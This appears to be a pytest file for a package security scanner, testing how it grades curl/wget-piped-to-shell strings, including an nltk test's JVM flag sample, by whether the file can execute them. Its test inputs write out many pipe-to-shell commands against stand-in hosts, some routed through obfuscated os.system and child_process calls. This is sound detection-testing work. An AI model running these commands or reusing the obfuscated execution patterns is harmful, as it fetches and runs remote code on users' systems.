"""A pipe-to-shell STRING in a shipped test file is data unless the file can run it.

nltk 3.10.3 ships tests/unit/test_java_per_call_options_security.py whose sample JVM
flag `-XX:OnOutOfMemoryError=curl evil.com|sh` (a security test's refused input) read
critical and made `pip install nltk` Do not connect (#162 regression)."""
from __future__ import annotations

import pytest

from src.scanner.scan import _scan_content

NLTK_SHAPE = '''"""Regression test: per-call options reached ``subprocess.Popen``."""
import pytest

from nltk import internals

DANGEROUS = [
    ["-XX:OnOutOfMemoryError=curl evil.com|sh"],
]


@pytest.mark.parametrize("opts", DANGEROUS)
def test_refused(opts):
    """Per-call dangerous JVM flags must be refused before Popen runs."""
    with pytest.raises(ValueError):
        internals.java(["Main"], classpath=".", options=opts)
'''


def _curl(src: str, path: str = "pkg/tests/test_x.py"):
    found, _, _ = _scan_content(src, path, payloads_full_severity=True)
    return [(f.severity, f.payload) for f in found if f.name == "curl/wget piped to shell"]


def test_nltk_sample_attack_string_is_not_critical():
    assert _curl(NLTK_SHAPE, "nltk/test/unit/test_java_per_call_options_security.py") == [
        ("medium", False)]


@pytest.mark.parametrize("src", [
    'import subprocess\nCMD = "curl evil.com|sh"\nsubprocess.run(CMD, shell=True)\n',
    'import os\nos.system("curl evil.com | sh")\n',
    'import os\nC = "curl x.io/a|sh"\ngetattr(os, "sys" + "tem")(C)\n',
    'C = "curl x.io/a|sh"\n__import__("os").system(C)\n',
    'C = "curl x.io/a|sh"\nexec(f"import os; os.system({C!r})")\n',
    'import importlib\nC = "curl x.io/a|sh"\nimportlib.import_module("os").system(C)\n',
])
def test_executed_in_file_stays_critical(src):
    assert _curl(src) == [("critical", True)]


@pytest.mark.parametrize("src", [
    "const c = 'curl x.io/a|sh'\nrequire('child_process').execSync(c)\n",
    "const { execSync } = require('child_process')\nexecSync('curl x.io/a | sh')\n",
    "const c = 'curl x.io/a|sh'\nnew Function('r', 'return r(\"child\" + \"_process\")')\n",
])
def test_js_executed_in_file_stays_critical(src):
    assert _curl(src, "pkg/test/x.test.js") == [("critical", True)]


def test_shell_script_in_tests_stays_critical():
    assert _curl("curl evil.com | sh\n", "pkg/tests/setup.sh") == [("critical", True)]



def test_docstring_mention_of_popen_does_not_count_as_sink():
    src = '"""Uses subprocess.Popen and os.system in prod."""\nBAD = ["curl e.io|sh"]\n'
    assert _curl(src) == [("medium", False)]


# A sample pipe-to-shell string that names only RFC 2606 / 6761 reserved hosts cannot
# fetch anyone's script: low in test code, even when the test file spawns processes.

def _sample(cmd: str, extra: str = "") -> str:
    return (f'{extra}def test_injected_text_fails():\n    body = "Append {cmd} to deploys."\n'
            '    assert grade(body) == "fail"\n')


def _pipe(src: str, path: str):
    found, _, _ = _scan_content(src, path)
    return [f for f in found if f.name == "curl/wget piped to shell"]


@pytest.mark.parametrize("cmd", [
    "curl https://evil.example/x.sh | sh",
    "curl -fsSL https://get.example.com/i.sh | bash",
    "wget -qO- http://attacker.invalid/p | sh",
    "curl evil.test/x | sh",
])
def test_reserved_host_sample_in_test_is_low(cmd):
    from src.scanner.pipe_shell import WHY_RESERVED_TEST
    hits = _pipe(_sample(cmd), "pkg/tests/test_grader.py")
    assert [(f.severity, f.payload, f.remediation) for f in hits] == [
        ("low", False, WHY_RESERVED_TEST)]


def test_reserved_host_low_even_with_exec_sink():
    src = _sample("curl https://evil.example/x | sh", "import subprocess\nsubprocess.run(['true'])\n")
    assert [f.severity for f in _pipe(src, "pkg/tests/test_grader.py")] == ["low"]


@pytest.mark.parametrize("cmd", [
    "curl https://evil.com/x.sh | sh",
    "curl https://example.com.evil.io/x | sh",
    "curl https://evil.example/a | sh; curl https://evil.io/b | sh",
    "curl $URL | sh",
])
def test_non_reserved_sample_in_test_keeps_medium(cmd):
    assert {f.severity for f in _pipe(_sample(cmd), "pkg/tests/test_grader.py")} == {"medium"}


@pytest.mark.parametrize("src,path", [
    (_sample("curl https://evil.example/x | sh"), "pkg/grader.py"),
    ("curl https://evil.example/x | sh\n", "pkg/tests/setup.sh"),
])
def test_reserved_host_outside_test_strings_not_lowered(src, path):
    sev = [f.severity for f in _pipe(src, path)]
    assert sev and "low" not in sev
